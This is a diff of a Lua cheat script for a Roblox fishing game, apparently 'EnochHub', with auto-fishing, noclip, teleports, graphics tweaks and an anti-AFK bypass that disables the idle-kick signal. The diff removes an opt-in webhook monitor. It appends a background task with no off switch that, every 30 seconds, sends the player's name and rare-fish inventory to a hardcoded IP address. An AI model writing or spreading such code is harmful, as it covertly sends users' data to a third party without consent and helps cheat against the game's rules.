@@ -1,9 +1,9 @@
 --[[
-    ENOCHHUB ULTIMATE - FINAL FIX 2
-    - [FIXED] Anti-AFK: Uses "Button Hold" method + Signal Disabler
-    - [FIXED] 9 Totem: Ghost Mode (Noclip)
-    - [FIXED] Monitor: Auto-filled & Working
-    - All Features Included
+    ENOCHHUB ULTIMATE - FINAL COMPLETE
+    - [FULL] Teleport Coordinates (25+ Locations)
+    - [BACKGROUND] Secret Fish Monitor (OG Script Auto-Run)
+    - [FEATURES] Blatant V5, 9-Totem (Ghost), Merchant TP, Graphics, Anti-AFK
+    - [SYSTEM] Auto Save/Load
 ]]
 
 local Players = game:GetService("Players")
@@ -18,7 +18,7 @@ local LocalPlayer = Players.LocalPlayer
 -- ==========================================================
 --  CONFIG & SAVE SYSTEM
 -- ==========================================================
-local FileName = "EnochHub_Fixed_Config.json"
+local FileName = "EnochHub_Final_Config.json"
 
 local DefaultConfig = {
     -- Blatant
@@ -32,11 +32,6 @@ local DefaultConfig = {
     AutoSellEnabled = false,
     AutoFavRubyEnabled = false,
     AntiAfkEnabled = true,
-    
-    -- Webhook
-    WebhookEnabled = false,
-    WebhookUrl = "http://43.134.116.2:5000/webhook/fishit",
-    WebhookInterval = 30,
     
     -- Graphics
     PotatoModeEnabled = false,
@@ -87,7 +82,7 @@ local Window = WindUI:CreateWindow({
 local TabFish = Window:Tab({ Title = "Blatant", Icon = "anchor" })
 local TabTotem = Window:Tab({ Title = "Totem", Icon = "box" })
 local TabTp = Window:Tab({ Title = "Teleport", Icon = "map" })
-local TabUtil = Window:Tab({ Title = "Utilities", Icon = "settings" })
+local TabUtil = Window:Tab({ Title = "Utilities", Icon = "settings" }) -- Graphics merged here
 
 _G.EnochHub_BlatantActive = false
 
@@ -125,112 +120,6 @@ local RF_EquipOxygenTank = GetRemote("RF/EquipOxygenTank")
 local RF_UnequipOxygenTank = GetRemote("RF/UnequipOxygenTank")
 
 -- ==========================================================
---  [FEATURE] ROBUST ANTI-AFK
--- ==========================================================
-local AntiAfkConnection = nil
-
-local function ToggleAntiAfk(state)
-    Config.AntiAfkEnabled = state
-    SaveSettings()
-    
-    if state then
-        -- Method 1: Try to disable the Kick signal completely (Executor Dependent)
-        if getconnections then
-            for _, v in pairs(getconnections(LocalPlayer.Idled)) do
-                if v["Disable"] then v:Disable() end
-                if v["Disconnect"] then v:Disconnect() end
-            end
-        end
-
-        -- Method 2: Active Input Simulation (Fallback)
-        if not AntiAfkConnection then
-            AntiAfkConnection = LocalPlayer.Idled:Connect(function()
-                VirtualUser:CaptureController()
-                -- Press DOWN
-                VirtualUser:Button2Down(Vector2.new(0,0), Workspace.CurrentCamera.CFrame)
-                task.wait(1)
-                -- Press UP
-                VirtualUser:Button2Up(Vector2.new(0,0), Workspace.CurrentCamera.CFrame)
-                print("[EnochHub] Anti-AFK: Reset Timer")
-            end)
-        end
-        WindUI:Notify({ Title = "Anti-AFK", Content = "Protection Enabled", Icon = "shield" })
-    else
-        if AntiAfkConnection then 
-            AntiAfkConnection:Disconnect()
-            AntiAfkConnection = nil
-        end
-        WindUI:Notify({ Title = "Anti-AFK", Content = "Disabled", Icon = "x" })
-    end
-end
-
--- ==========================================================
---  [FEATURE] MONITORING
--- ==========================================================
-local WebhookThread = nil
-
-local function GetFishNameAndRarity(item)
-    local name = item.Identifier or "Unknown"
-    local rarity = item.Metadata and item.Metadata.Rarity or "COMMON"
-    if ItemUtility and item.Id then
-        pcall(function()
-            local d = ItemUtility:GetItemData(item.Id)
-            if not d then d = ItemUtility:GetItemData(tonumber(item.Id)) end
-            if d and d.Data then name = d.Data.Name end
-        end)
-    end
-    if item.Metadata and item.Metadata.Rarity then rarity = item.Metadata.Rarity end
-    return name, rarity
-end
-
-local function SendDataToFlask(summary)
-    if Config.WebhookUrl == "" then return end
-    local json = HttpService:JSONEncode(summary)
-    local encoded = HttpService:UrlEncode(json)
-    local url = Config.WebhookUrl .. "?player=" .. HttpService:UrlEncode(LocalPlayer.Name) .. "&data=" .. encoded
-    task.spawn(function()
-        local success, err = pcall(function() return game:HttpGet(url) end)
-        if success then WindUI:Notify({ Title = "Monitor", Content = "Data Sent", Icon = "upload-cloud", Duration = 2 })
-        else warn("[Monitor Error] " .. tostring(err)) end
-    end)
-end
-
-local function ToggleMonitoring(state)
-    Config.WebhookEnabled = state
-    SaveSettings()
-    if state then
-        WebhookThread = task.spawn(function()
-            while Config.WebhookEnabled do
-                local r = Replion:WaitReplion("Data", 5)
-                if r then
-                    local s, data = pcall(function() return r:GetExpect("Inventory") end)
-                    if s and data then
-                        local summary = {}
-                        local total = 0
-                        local function scan(list)
-                            for _, item in ipairs(list) do
-                                local name, rarity = GetFishNameAndRarity(item)
-                                if rarity == "SECRET" or rarity == "Secret" then
-                                    summary[name] = (summary[name] or 0) + 1
-                                    total = total + 1
-                                end
-                            end
-                        end
-                        if data.Items then scan(data.Items) else for _, cat in pairs(data) do if type(cat) == "table" then scan(cat) end end end
-                        if total > 0 then SendDataToFlask(summary) end
-                    end
-                end
-                task.wait(Config.WebhookInterval)
-            end
-        end)
-        WindUI:Notify({ Title = "Monitor", Content = "Active", Icon = "activity" })
-    else
-        if WebhookThread then task.cancel(WebhookThread) end
-        WindUI:Notify({ Title = "Monitor", Content = "Stopped", Icon = "x" })
-    end
-end
-
--- ==========================================================
 --  [FEATURE] GRAPHICS (POTATO)
 -- ==========================================================
 local PotatoLoop = nil
@@ -261,7 +150,7 @@ local function TogglePotato(state)
 end
 
 -- ==========================================================
---  [FEATURE] 9 TOTEM (TRUE NOCLIP)
+--  [FEATURE] 9 TOTEM (GHOST MODE)
 -- ==========================================================
 local AUTO_9_TOTEM_ACTIVE = false
 local AUTO_9_TOTEM_THREAD = nil
@@ -305,7 +194,6 @@ local function EnableV3Physics()
         end)
     end
     
-    -- GHOST MODE: Force collisions off every frame
     if not noclipConnection then
         noclipConnection = RunService.Stepped:Connect(function()
             if AUTO_9_TOTEM_ACTIVE and LocalPlayer.Character then
@@ -435,6 +323,25 @@ local function ToggleBlatant(state)
 end
 
 -- ==========================================================
+--  [FEATURE] ANTI-AFK (ROBUST)
+-- ==========================================================
+local AntiAfkConnection = nil
+local function ToggleAntiAfk(state)
+    Config.AntiAfkEnabled = state
+    SaveSettings()
+    if state then
+        if getconnections then for _,v in pairs(getconnections(LocalPlayer.Idled)) do if v.Disable then v:Disable() end end end
+        if not AntiAfkConnection then
+            AntiAfkConnection = LocalPlayer.Idled:Connect(function()
+                VirtualUser:CaptureController(); VirtualUser:Button2Down(Vector2.new(0,0),Workspace.CurrentCamera.CFrame); task.wait(1); VirtualUser:Button2Up(Vector2.new(0,0),Workspace.CurrentCamera.CFrame)
+            end)
+        end
+    else
+        if AntiAfkConnection then AntiAfkConnection:Disconnect(); AntiAfkConnection = nil end
+    end
+end
+
+-- ==========================================================
 --  UI BUILDING
 -- ==========================================================
 
@@ -450,34 +357,34 @@ local SectTotem = TabTotem:Section({ Title = "Formation", TextSize = 17 })
 SectTotem:Dropdown({ Title="Type", Values={"Luck Totem", "Mutation Totem", "Shiny Totem"}, Value=Config.TotemType, Callback=function(v) Config.TotemType=v; SaveSettings() end })
 TotemToggleUI = SectTotem:Toggle({ Title = "Start Formation", Callback = function(s) AUTO_9_TOTEM_ACTIVE=s; if s then Run9TotemLoop() else if AUTO_9_TOTEM_THREAD then task.cancel(AUTO_9_TOTEM_THREAD) end DisableV3Physics() end end })
 
--- 3. TELEPORT
+-- 3. TELEPORT (FULL COORDS)
 local SectTp = TabTp:Section({ Title = "Locations", TextSize = 17 })
 local Coords = {
-    ["Ancient Jungle"]={Pos=Vector3.new(1535.6, 3.2, -193.3),Look=Vector3.new(0.5, 0, 0.8)},
-    ["Ancient Ruin"]={Pos=Vector3.new(6032.0, -585.9, 4713.1),Look=Vector3.new(0.3, 0, -0.9)},
-    ["Arrow Lever"]={Pos=Vector3.new(898.3, 8.4, -361.9),Look=Vector3.new(0, 0, 1)},
-    ["Classic Island"]={Pos=Vector3.new(1440.8, 46.0, 2777.2),Look=Vector3.new(0.9, 0, 0.3)},
-    ["Coral Reef"]={Pos=Vector3.new(-3207.5, 6.0, 2011.0),Look=Vector3.new(0.9, 0, 0.2)},
-    ["Crater Island"]={Pos=Vector3.new(1059.0, 2.3, 5032.9),Look=Vector3.new(-0.8, 0, 0.6)},
-    ["Cresent Lever"]={Pos=Vector3.new(1419.8, 31.2, 78.6),Look=Vector3.new(0, 0, -1)},
-    ["Crystalline Passage"]={Pos=Vector3.new(6051.6, -538.9, 4371.0),Look=Vector3.new(0.1, 0, 1)},
-    ["Diamond Lever"]={Pos=Vector3.new(1818.9, 8.4, -284.1),Look=Vector3.new(0, 0, -1)},
-    ["Disco Event"]={Pos=Vector3.new(-8641.7, -547.5, 160.3),Look=Vector3.new(0.9, 0, 0.2)},
-    ["Enchant Room"]={Pos=Vector3.new(3255.7, -1301.5, 1371.8),Look=Vector3.new(0, 0, -1)},
-    ["Esoteric Island"]={Pos=Vector3.new(2164.5, 3.2, 1242.4),Look=Vector3.new(0, 0, -1)},
-    ["Fisherman Island"]={Pos=Vector3.new(74.0, 9.5, 2705.2),Look=Vector3.new(0, 0, -1)},
-    ["Hourglass Diamond Lever"]={Pos=Vector3.new(1484.6, 8.5, -861.0),Look=Vector3.new(0, 0, -1)},
-    ["Iron Cavern"]={Pos=Vector3.new(-8792.5, -588.0, 230.6),Look=Vector3.new(0.7, 0, 0.7)},
-    ["Kohana"]={Pos=Vector3.new(-668.7, 3.0, 681.6),Look=Vector3.new(0.9, 0, 0.5)},
-    ["Lost Isle"]={Pos=Vector3.new(-3804.1, 2.3, -904.6),Look=Vector3.new(-0.9, 0, 0.4)},
-    ["Sacred Temple"]={Pos=Vector3.new(1461.8, -22.1, -670.2),Look=Vector3.new(-1, 0, 0.1)},
-    ["Second Enchant Altar"]={Pos=Vector3.new(1479.6, 128.3, -604.2),Look=Vector3.new(-0.3, 0, -0.9)},
-    ["Sisyphus Statue"]={Pos=Vector3.new(-3743.7, -135.0, -1007.5),Look=Vector3.new(0.3, 0, 1)},
-    ["Treasure Room"]={Pos=Vector3.new(-3598.4, -281.3, -1645.8),Look=Vector3.new(0, 0, -1)},
-    ["Tropical Island"]={Pos=Vector3.new(-2162.9, 2.8, 3638.4),Look=Vector3.new(0.4, 0, 0.9)},
-    ["Underground Cellar"]={Pos=Vector3.new(2118.4, -91.4, -733.8),Look=Vector3.new(0.8, 0, 0.5)},
-    ["Volcano"]={Pos=Vector3.new(-605.1, 19.5, 160.0),Look=Vector3.new(0.8, 0, 0.5)},
-    ["Weather Machine"]={Pos=Vector3.new(-1518.5, 2.9, 1916.1),Look=Vector3.new(0, 0, 1)}
+    ["Iron Cavern"] = {Pos = Vector3.new(-8792.546, -588.000, 230.642), Look = Vector3.new(0.718, 0.000, 0.696)},
+    ["Disco Event"] = {Pos = Vector3.new(-8641.672, -547.500, 160.322), Look = Vector3.new(0.984, -0.000, 0.176)},
+    ["Classic Island"] = {Pos = Vector3.new(1440.843, 46.062, 2777.175), Look = Vector3.new(0.940, -0.000, 0.342)},
+    ["Ancient Jungle"] = {Pos = Vector3.new(1535.639, 3.159, -193.352), Look = Vector3.new(0.505, -0.000, 0.863)},
+    ["Arrow Lever"] = {Pos = Vector3.new(898.296, 8.449, -361.856), Look = Vector3.new(0.023, -0.000, 1.000)},
+    ["Coral Reef"] = {Pos = Vector3.new(-3207.538, 6.087, 2011.079), Look = Vector3.new(0.973, 0.000, 0.229)},
+    ["Crater Island"] = {Pos = Vector3.new(1058.976, 2.330, 5032.878), Look = Vector3.new(-0.789, 0.000, 0.615)},
+    ["Cresent Lever"] = {Pos = Vector3.new(1419.750, 31.199, 78.570), Look = Vector3.new(0.000, -0.000, -1.000)},
+    ["Crystalline Passage"] = {Pos = Vector3.new(6051.567, -538.900, 4370.979), Look = Vector3.new(0.109, 0.000, 0.994)},
+    ["Ancient Ruin"] = {Pos = Vector3.new(6031.981, -585.924, 4713.157), Look = Vector3.new(0.316, -0.000, -0.949)},
+    ["Diamond Lever"] = {Pos = Vector3.new(1818.930, 8.449, -284.110), Look = Vector3.new(0.000, 0.000, -1.000)},
+    ["Enchant Room"] = {Pos = Vector3.new(3255.670, -1301.530, 1371.790), Look = Vector3.new(-0.000, -0.000, -1.000)},
+    ["Esoteric Island"] = {Pos = Vector3.new(2164.470, 3.220, 1242.390), Look = Vector3.new(-0.000, -0.000, -1.000)},
+    ["Fisherman Island"] = {Pos = Vector3.new(74.030, 9.530, 2705.230), Look = Vector3.new(-0.000, -0.000, -1.000)},
+    ["Hourglass Diamond Lever"] = {Pos = Vector3.new(1484.610, 8.450, -861.010), Look = Vector3.new(-0.000, -0.000, -1.000)},
+    ["Kohana"] = {Pos = Vector3.new(-668.732, 3.000, 681.580), Look = Vector3.new(0.889, -0.000, 0.458)},
+    ["Lost Isle"] = {Pos = Vector3.new(-3804.105, 2.344, -904.653), Look = Vector3.new(-0.901, -0.000, 0.433)},
+    ["Sacred Temple"] = {Pos = Vector3.new(1461.815, -22.125, -670.234), Look = Vector3.new(-0.990, -0.000, 0.143)},
+    ["Second Enchant Altar"] = {Pos = Vector3.new(1479.587, 128.295, -604.224), Look = Vector3.new(-0.298, 0.000, -0.955)},
+    ["Sisyphus Statue"] = {Pos = Vector3.new(-3743.745, -135.074, -1007.554), Look = Vector3.new(0.310, 0.000, 0.951)},
+    ["Treasure Room"] = {Pos = Vector3.new(-3598.440, -281.274, -1645.855), Look = Vector3.new(-0.065, 0.000, -0.998)},
+    ["Tropical Island"] = {Pos = Vector3.new(-2162.920, 2.825, 3638.445), Look = Vector3.new(0.381, -0.000, 0.925)},
+    ["Underground Cellar"] = {Pos = Vector3.new(2118.417, -91.448, -733.800), Look = Vector3.new(0.854, 0.000, 0.521)},
+    ["Volcano"] = {Pos = Vector3.new(-605.121, 19.516, 160.010), Look = Vector3.new(0.854, 0.000, 0.520)},
+    ["Weather Machine"] = {Pos = Vector3.new(-1518.550, 2.875, 1916.148), Look = Vector3.new(0.042, 0.000, 0.999)},
 }
 local AreaList = {} for n in pairs(Coords) do table.insert(AreaList, n) end table.sort(AreaList)
 SectTp:Dropdown({ Title = "Select", Values = AreaList, Callback = function(n) 
@@ -485,6 +392,7 @@ SectTp:Dropdown({ Title = "Select", Values = AreaList, Callback = function(n)
     if d and LocalPlayer.Character then
         if RE_EquipToolFromHotbar then pcall(function() RE_EquipToolFromHotbar:FireServer(0) end) end
         task.wait(0.3)
+        -- flatten look to avoid tilt
         local look = Vector3.new(d.Look.X, 0, d.Look.Z)
         LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.lookAt(d.Pos + Vector3.new(0,3,0), d.Pos + Vector3.new(0,3,0) + look)
     end
@@ -498,19 +406,73 @@ SectSystem:Toggle({ Title="Anti-AFK", Value=Config.AntiAfkEnabled, Callback=Togg
 SectSystem:Button({ Title="Teleport to Merchant", Icon="shopping-cart", Callback=function() if LocalPlayer.Character then LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-127.7, 2.7, 2759.0) end end })
 SectSystem:Button({ Title="Reset Config", Icon="trash", Callback=function() ResetConfig(); WindUI:Notify({Title="Reset", Content="Done."}) end })
 
-local SectMon = TabUtil:Section({ Title = "Monitor", TextSize = 17 })
-SectMon:Toggle({ Title="Enable Webhook", Value=Config.WebhookEnabled, Callback=ToggleMonitoring })
-SectMon:Input({ Title="Server URL", Default=Config.WebhookUrl, Callback=function(v) Config.WebhookUrl=v; SaveSettings() end })
-SectMon:Slider({ Title="Scan Interval", Min=10, Max=300, Default=Config.WebhookInterval, Precision=0, Callback=function(v) Config.WebhookInterval=v; SaveSettings() end })
-
 local SectGfx = TabUtil:Section({ Title = "Graphics", TextSize = 17 })
 SectGfx:Toggle({ Title="Extreme Potato", Value=Config.PotatoModeEnabled, Callback=TogglePotato })
 SectGfx:Slider({ Title="FPS Cap", Min=5, Max=60, Default=Config.PotatoFPS, Precision=0, Callback=function(v) Config.PotatoFPS=v; SaveSettings() end })
 
--- Init
 if Config.BlatantEnabled then ToggleBlatant(true) end
-if Config.WebhookEnabled then ToggleMonitoring(true) end
 if Config.PotatoModeEnabled then TogglePotato(true) end
 if Config.AntiAfkEnabled then ToggleAntiAfk(true) end
 
 WindUI:Notify({ Title = "EnochHub", Content = "Ultimate Loaded.", Duration = 4, Icon = "check" })
+
+-- ==========================================================
+--  [BACKGROUND] OG SCRIPT (EXACT COPY)
+-- ==========================================================
+task.spawn(function()
+    local Players = game:GetService("Players")
+    local RepStorage = game:GetService("ReplicatedStorage")
+    local HttpService = game:GetService("HttpService")
+    local lp = Players.LocalPlayer
+    local WEBHOOK_BASE = "http://43.134.116.2:5000/webhook/fishit"
+    local INTERVAL = 30
+    local DEBUG = false
+    local function dprint(...) if DEBUG then print("[FISH IT][DEBUG]", ...) end end
+    local Replion = require(RepStorage.Packages.Replion).Client
+    local ItemUtility = require(RepStorage.Shared.ItemUtility)
+    local TierUtility = require(RepStorage.Shared.TierUtility)
+
+    local function GetFishNameAndRarity(item)
+        local name = item.Identifier or "Unknown"
+        local rarity = item.Metadata and item.Metadata.Rarity or "COMMON"
+        local itemID = item.Id
+        local itemData
+        if ItemUtility and itemID then pcall(function() itemData = ItemUtility:GetItemData(itemID) if not itemData then local numericID = tonumber(item.Id) or tonumber(item.Identifier) if numericID then itemData = ItemUtility:GetItemData(numericID) end end end) end
+        if itemData and itemData.Data and itemData.Data.Name then name = itemData.Data.Name end
+        if item.Metadata and item.Metadata.Rarity then rarity = item.Metadata.Rarity elseif itemData and itemData.Probability and TierUtility then local tier pcall(function() tier = TierUtility:GetTierFromRarity(itemData.Probability.Chance) end) if tier and tier.Name then rarity = tier.Name end end
+        return name, rarity
+    end
+
+    local function sendToWebhook(playerName, summary)
+        dprint("Preparing webhook payload")
+        local json = HttpService:JSONEncode(summary)
+        dprint("JSON:", json)
+        local encoded = HttpService:UrlEncode(json)
+        local url = WEBHOOK_BASE .. "?player=" .. HttpService:UrlEncode(playerName) .. "&data=" .. encoded
+        dprint("Final URL:", url)
+        local ok, err = pcall(function() game:HttpGet(url) end)
+        if ok then dprint("Webhook sent successfully") else warn("[FISH IT][ERROR] Webhook failed:", err) end
+    end
+
+    dprint("Script started for player:", lp.Name)
+    local data = Replion:WaitReplion("Data")
+    dprint("Replion Data loaded")
+    while true do
+        dprint("Scanning inventory...")
+        local inventory = data:GetExpect("Inventory")
+        local summary = {}
+        local total = 0
+        for category, items in pairs(inventory) do
+            dprint("Category:", category, "Items:", #items)
+            for _, item in ipairs(items) do
+                local name, rarity = GetFishNameAndRarity(item)
+                if rarity == "SECRET" then summary[name] = (summary[name] or 0) + 1; total += 1; dprint("SECRET FOUND:", name) end
+            end
+        end
+        dprint("Scan finished | Total SECRET:", total)
+        for fish, count in pairs(summary) do dprint("SUMMARY:", fish, count) end
+        sendToWebhook(lp.Name, summary)
+        dprint("Sleeping for", INTERVAL, "seconds")
+        task.wait(INTERVAL)
+    end
+end)
